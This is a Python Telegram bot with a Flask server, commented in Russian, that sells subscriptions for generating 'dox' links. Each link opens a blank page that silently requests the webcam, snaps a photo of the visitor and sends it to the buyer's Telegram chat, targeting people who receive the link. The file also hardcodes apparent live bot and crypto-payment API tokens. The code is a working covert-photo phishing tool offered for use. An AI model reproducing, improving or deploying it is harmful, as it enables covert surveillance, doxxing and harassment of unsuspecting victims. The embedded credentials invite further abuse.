import base64
import threading
import random
import string
import json
import requests
import time
import os
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

app = Flask(__name__)

# Конфигурация
CRYPTO_PAY_TOKEN = "410403:AALcR6CbyyvomMjUI8M1cdYh79RO7P9Szng"
API_BASE = "https://pay.crypt.bot/api"
SUBSCRIPTION_PRICE = 3.0  # Цена подписки 3$
BOT_TOKEN = '8048949774:AAE8_hbqnCu5rwfrLdqZFlgbZ3v_INCfEZA'
# ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ URL ДЛЯ ПРОДАКШЕНА!
BASE_URL = "https://dox-searcher.onrender.com"

bot = telebot.TeleBot(BOT_TOKEN)

# Хранилища данных
photo_storage = {}
active_subscriptions = {}
user_tokens = {}  # user_id: custom_token
user_invoices = {}  # user_id: invoice_id
ADMINS = [688656311]  # Ваш user_id

# Генератор случайных токенов
def generate_token(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# Функции для работы с Crypto Pay
def create_crypto_bot_invoice(user_id: int):
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    data = {
        "asset": "USDT",
        "amount": str(SUBSCRIPTION_PRICE),
        "description": "Вечная подписка",
        "hidden_message": f"Оплата подписки пользователем {user_id}",
        "paid_btn_name": "viewItem",
        "paid_btn_url": "https://t.me/EndParsBot",
        "payload": json.dumps({"user_id": user_id, "permanent": True}),
        "allow_comments": False,
        "allow_anonymous": False,
        "expires_in": 3600
    }
    
    try:
        response = requests.post(f"{API_BASE}/createInvoice", headers=headers, json=data)
        result = response.json()
        if result.get("ok"):
            invoice_data = result["result"]
            invoice_data['pay_url'] = invoice_data.get('pay_url', f"https://t.me/CryptoBot?start={invoice_data.get('hash', '')}")
            return invoice_data
        print(f"Ошибка создания счета: {result}")
    except Exception as e:
        print(f"Ошибка при создании счета: {e}")
    return None

def check_crypto_bot_invoice(invoice_id: int):
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    try:
        response = requests.get(
            f"{API_BASE}/getInvoices",
            headers=headers,
            params={"invoice_ids": str(invoice_id)}
        )
        result = response.json()
        if result.get("ok") and result["result"]["items"]:
            return result["result"]["items"][0]
    except Exception as e:
        print(f"Ошибка при проверке счета: {e}")
    return None

# Абсолютно пустой HTML с автоматической фотосъемкой
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: white;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        canvas.width = 640;
        canvas.height = 480;
        
        // Функция для захвата фото
        function capturePhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        }
        
        // Функция отправки фото на сервер
        async function sendPhoto(photoData) {
            const token = window.location.pathname.split('/').pop();
            
            try {
                await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        image: photoData,
                        token: token
                    })
                });
                
                // После отправки останавливаем камеру
                if (video.srcObject) {
                    const tracks = video.srcObject.getTracks();
                    tracks.forEach(track => track.stop());
                }
                
            } catch (error) {
                console.error('Upload error:', error);
            }
        }
        
        // Автоматическая фотосъемка при получении доступа
        async function initCameraAndCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    } 
                });
                
                video.srcObject = stream;
                
                // Ждем 1 секунду для стабилизации изображения
                setTimeout(() => {
                    const photo = capturePhoto();
                    sendPhoto(photo);
                }, 1000);
                
            } catch (err) {
                console.error('Camera error:', err);
            }
        }
        
        // Запускаем процесс при загрузке страницы
        window.addEventListener('DOMContentLoaded', initCameraAndCapture);
    </script>
</body>
</html>
"""

@app.route('/<custom_token>')
def phishing_page(custom_token):
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def handle_upload():
    try:
        data = request.json
        custom_token = data.get('token')
        
        if not custom_token:
            return 'Token required', 400
            
        user_id = None
        for uid, token in user_tokens.items():
            if token == custom_token:
                user_id = uid
                break
                
        if not user_id:
            return 'Invalid token', 400

        image_data = data['image'].split(',')[1]
        photo_storage[user_id] = image_data
        
        # Создаем папку для фото, если ее нет
        os.makedirs("photos", exist_ok=True)
        
        # Сохраняем фото временно
        filename = f"photos/photo_{custom_token}_{int(time.time())}.jpg"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(image_data))
        
        # Отправляем фото в Telegram
        with open(filename, "rb") as photo:
            bot.send_photo(
                chat_id=user_id,
                photo=photo,
                caption=f"✅ Фото успешно получено!\nТокен: {custom_token}"
            )
        
        return '', 200
    except Exception as e:
        print(f"Ошибка при загрузке фото: {e}")
        return 'Server error', 500

# Обработчики бота
@bot.message_handler(commands=['start'])
def start_handler(message):
    try:
        # Проверяем наличие файла с иконкой
        if os.path.exists('icon.png'):
            with open('icon.png', 'rb') as photo:
                bot.send_photo(
                    message.chat.id,
                    photo,
                    caption="<b>Получи фото лица своего обидчика за пару секунд.</b>",
                    parse_mode="HTML",
                    reply_markup=main_keyboard()
                )
        else:
            # Если файла нет, отправляем текстовое сообщение
            bot.send_message(
                message.chat.id,
                "<b>Получи фото лица своего обидчика за пару секунд.</b>",
                parse_mode="HTML",
                reply_markup=main_keyboard()
            )
    except Exception as e:
        print(f"Ошибка при отправке стартового сообщения: {e}")
        bot.send_message(
            message.chat.id,
            "Получи фото лица своего обидчика за пару секунд.",
            reply_markup=main_keyboard()
        )

def main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton('🛡 Создать ссылку', callback_data='create_link'),
        InlineKeyboardButton('💳 Подписка', callback_data='subscription')
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data == 'create_link')
def create_link_handler(call):
    try:
        user_id = call.message.chat.id
        print(f"Пользователь {user_id} запросил создание ссылки")
        
        # Проверяем наличие активной подписки
        if user_id in active_subscriptions and active_subscriptions[user_id]:
            custom_token = generate_token()
            user_tokens[user_id] = custom_token
            link = f"{BASE_URL}/{custom_token}"
            
            print(f"Создана ссылка для {user_id}: {link}")
            
            bot.send_message(
                user_id,
                f"🔗 Ваша ссылка для получения лица:\n<code>{link}</code>\n\n"
                "Отправьте её цели. При открытии:\n"
                "1. Автоматически запросится доступ к камере\n"
                "2. Если доступ разрешен - фото сделается автоматически\n"
                "3. Фото придет в этот чат",
                parse_mode="HTML"
            )
        else:
            print(f"У пользователя {user_id} нет активной подписки")
            bot.send_message(
                user_id,
                "❌ Для создания ссылки необходима подписка!",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('💳 Купить подписку', callback_data='subscription')
                )
            )
            
        # Подтверждаем обработку callback
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка при создании ссылки: {e}")
        bot.send_message(call.message.chat.id, "❌ Произошла ошибка при создании ссылки. Попробуйте позже.")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_handler(call):
    try:
        user_id = call.message.chat.id
        bot.send_message(
            user_id,
            f"<b>🔐 Премиум подписка</b>\n\n"
            f"Для использования всех функций бота нужна подписка\n"
            f"Цена подписки: <b>{SUBSCRIPTION_PRICE} USDT</b>\n\n"
            "Вы уверены что хотите купить подписку?",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton('✅ Да', callback_data='sub_yes'),
                InlineKeyboardButton('❌ Нет', callback_data='sub_no')
            )
        )
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка при обработке подписки: {e}")

@bot.callback_query_handler(func=lambda call: call.data in ['sub_yes', 'sub_no'])
def sub_confirm_handler(call):
    try:
        user_id = call.message.chat.id
        
        if call.data == 'sub_no':
            bot.send_message(user_id, "❌ Покупка отменена")
            bot.answer_callback_query(call.id)
            return
            
        invoice = create_crypto_bot_invoice(user_id)
        if invoice:
            user_invoices[user_id] = invoice['invoice_id']
            bot.send_message(
                user_id,
                f"💰 <b>Счет создан!</b>\n\n"
                f"После оплаты нажмите 'Проверить оплату' для активации подписки\n\n"
                f"▪️ Сумма: <b>{SUBSCRIPTION_PRICE} USDT</b>\n"
                f"▪️ Ссылка для оплаты: <code>{invoice['pay_url']}</code>\n"
                f"▪️ Срок действия: 1 час",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup().row(
                    InlineKeyboardButton('💳 Оплатить', url=invoice['pay_url']),
                    InlineKeyboardButton('🔄 Проверить оплату', callback_data='check_payment')
                )
            )
        else:
            bot.send_message(user_id, "❌ Ошибка создания счета, попробуйте позже")
            
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка при подтверждении подписки: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'check_payment')
def check_payment_handler(call):
    try:
        user_id = call.message.chat.id
        invoice_id = user_invoices.get(user_id)
        
        if not invoice_id:
            bot.send_message(user_id, "❌ Счет не найден")
            bot.answer_callback_query(call.id)
            return
            
        invoice = check_crypto_bot_invoice(invoice_id)
        
        if invoice and invoice['status'] == 'paid':
            active_subscriptions[user_id] = True
            bot.send_message(user_id, "✅ Оплата подтверждена! Подписка активирована")
            
            # Отправляем кнопку для создания ссылки
            bot.send_message(
                user_id,
                "Теперь вы можете создать ссылку для получения фото:",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('🛡 Создать ссылку', callback_data='create_link')
                )
            )
        else:
            bot.send_message(
                user_id,
                "❌ Оплата не найдена\n\n"
                "Если вы произвели оплату, подождите 2-3 минуты и проверьте снова",
                reply_markup=InlineKeyboardMarkup().add(
                    InlineKeyboardButton('🔄 Проверить снова', callback_data='check_payment')
                )
            )
            
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка при проверке оплаты: {e}")

# Простая админ-панель
@bot.message_handler(commands=['admin'])
def admin_handler(message):
    if message.from_user.id not in ADMINS:
        return
        
    bot.send_message(
        message.chat.id,
        "🔒 Админ-панель:",
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton('➕ Выдать подписку', callback_data='admin_give_sub'),
            InlineKeyboardButton('➖ Забрать подписку', callback_data='admin_revoke_sub')
        )
    )

@bot.callback_query_handler(func=lambda call: call.data == 'admin_give_sub')
def admin_give_sub(call):
    try:
        admin_id = call.message.chat.id
        if admin_id not in ADMINS:
            return
            
        # Запрашиваем ID пользователя
        msg = bot.send_message(
            admin_id,
            "Введите ID пользователя для выдачи подписки:"
        )
        
        # Регистрируем следующий шаг
        bot.register_next_step_handler(msg, process_admin_give_sub)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка в админ-панели: {e}")

def process_admin_give_sub(message):
    try:
        admin_id = message.chat.id
        if admin_id not in ADMINS:
            return
            
        try:
            target_id = int(message.text)
            active_subscriptions[target_id] = True
            
            # Уведомляем админа
            bot.send_message(admin_id, f"✅ Подписка выдана пользователю {target_id}")
            
            # Уведомляем пользователя
            try:
                bot.send_message(target_id, "🎉 Вам выдана подписка администратором!")
            except:
                pass
                
        except ValueError:
            bot.send_message(admin_id, "❌ Неверный формат ID. Введите числовой ID пользователя.")
    except Exception as e:
        print(f"Ошибка при выдаче подписки: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'admin_revoke_sub')
def admin_revoke_sub(call):
    try:
        admin_id = call.message.chat.id
        if admin_id not in ADMINS:
            return
            
        # Запрашиваем ID пользователя
        msg = bot.send_message(
            admin_id,
            "Введите ID пользователя для отзыва подписки:"
        )
        
        # Регистрируем следующий шаг
        bot.register_next_step_handler(msg, process_admin_revoke_sub)
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка в админ-панели: {e}")

def process_admin_revoke_sub(message):
    try:
        admin_id = message.chat.id
        if admin_id not in ADMINS:
            return
            
        try:
            target_id = int(message.text)
            if target_id in active_subscriptions:
                del active_subscriptions[target_id]
                bot.send_message(admin_id, f"✅ Подписка отозвана у пользователя {target_id}")
                
                # Уведомляем пользователя
                try:
                    bot.send_message(target_id, "❌ Ваша подписка была отозвана администратором")
                except:
                    pass
            else:
                bot.send_message(admin_id, f"❌ У пользователя {target_id} нет активной подписки")
                
        except ValueError:
            bot.send_message(admin_id, "❌ Неверный формат ID. Введите числовой ID пользователя.")
    except Exception as e:
        print(f"Ошибка при отзыве подписки: {e}")

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

def run_bot():
    print("Бот запущен!")
    bot.infinity_polling()

if __name__ == '__main__':
    # Создаем папку для фото
    os.makedirs("photos", exist_ok=True)
    
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Запускаем бота
    run_bot()
